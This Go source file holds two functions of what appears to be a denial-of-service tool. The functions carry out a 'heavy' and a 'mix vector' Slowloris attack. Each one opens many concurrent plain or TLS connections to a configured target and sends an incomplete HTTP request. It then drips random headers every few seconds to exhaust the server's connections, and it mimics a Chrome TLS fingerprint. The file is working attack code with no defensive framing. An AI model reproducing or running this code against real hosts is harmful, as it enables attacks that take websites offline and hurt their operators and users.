package main

import (
	"crypto/tls"
	"fmt"
	mrand "math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

func executeHeavySlowloris() {
	fmt.Printf("[VECTOR] HEAVY Slowloris — Direct + TLS\n")
	connsPerThread := 15
	if cfg.threadCount > 100 {
		connsPerThread = 8
	}
	var wg sync.WaitGroup
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id)))
			for c := 0; c < connsPerThread; c++ {
				go func(connId int) {
					target := fmt.Sprintf("%s:%d", cfg.targetHost, cfg.targetPort)
					var conn net.Conn
					var err error
					dialer := &net.Dialer{Timeout: 5 * time.Second}
					if cfg.targetTLS {
						tlsConn, dialErr := tls.DialWithDialer(dialer, "tcp", target, getChromeTLSConfig())
						if dialErr != nil {
							return
						}
						conn = tlsConn
					} else {
						conn, err = dialer.Dial("tcp", target)
						if err != nil {
							return
						}
					}
					defer conn.Close()
					conn.SetDeadline(time.Time{})
					path := randomPath()
					conn.Write([]byte(fmt.Sprintf("GET %s HTTP/1.1\r\n", path)))
					headers := buildSlowlorisHeaders()
					for _, h := range headers {
						if time.Now().After(stopTime) {
							return
						}
						conn.Write([]byte(h))
						time.Sleep(time.Duration(200+rng.Intn(1200)) * time.Millisecond)
					}
					headerNames := []string{
						"X-Custom", "X-Request", "X-Session", "X-Token",
						"X-Device", "X-App", "X-Platform", "X-Version",
						"X-Client", "X-Browser", "X-OS", "X-Device-ID",
						"X-Correlation-ID", "X-Trace-ID", "X-Request-ID",
					}
					for !time.Now().After(stopTime) {
						headerName := headerNames[rng.Intn(len(headerNames))]
						headerValue := fmt.Sprintf("%d.%d.%d.%d",
							rng.Intn(223)+1, rng.Intn(256), rng.Intn(256), rng.Intn(255)+1)
						_, err := conn.Write([]byte(fmt.Sprintf("%s: %s\r\n", headerName, headerValue)))
						if err != nil {
							return
						}
						atomic.AddUint64(&totalRequests, 1)
						time.Sleep(time.Duration(3+rng.Intn(12)) * time.Second)
					}
				}(c)
			}
		}(i)
	}
	wg.Wait()
}

func executeMixVectorSlowloris(threadCount int) {
	connsPerThread := 20
	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id)))
			for c := 0; c < connsPerThread; c++ {
				go func(connId int) {
					target := fmt.Sprintf("%s:%d", cfg.targetHost, cfg.targetPort)
					var conn net.Conn
					var err error
					dialer := &net.Dialer{Timeout: 5 * time.Second}
					if cfg.targetTLS {
						tlsConn, dialErr := tls.DialWithDialer(dialer, "tcp", target, getChromeTLSConfig())
						if dialErr != nil {
							return
						}
						conn = tlsConn
					} else {
						conn, err = dialer.Dial("tcp", target)
						if err != nil {
							return
						}
					}
					defer conn.Close()
					conn.SetDeadline(time.Time{})
					path := randomPath()
					conn.Write([]byte(fmt.Sprintf("GET %s HTTP/1.1\r\n", path)))
					headers := buildSlowlorisHeaders()
					for _, h := range headers {
						if time.Now().After(stopTime) {
							return
						}
						conn.Write([]byte(h))
						time.Sleep(time.Duration(200+rng.Intn(1200)) * time.Millisecond)
					}
					slowHeaderNames := []string{
						"X-Custom", "X-Request", "X-Session", "X-Token",
						"X-Device", "X-App", "X-Platform", "X-Version",
						"X-Client", "X-Browser", "X-OS", "X-Device-ID",
						"X-Correlation-ID", "X-Trace-ID", "X-Request-ID",
					}
					for !time.Now().After(stopTime) {
						hn := slowHeaderNames[rng.Intn(len(slowHeaderNames))]
						_, err := conn.Write([]byte(fmt.Sprintf("%s: %s\r\n", hn, randomIPAddress())))
						if err != nil {
							return
						}
						atomic.AddUint64(&totalRequests, 1)
						time.Sleep(time.Duration(3+rng.Intn(12)) * time.Second)
					}
				}(c)
			}
		}(i)
	}
	wg.Wait()
}
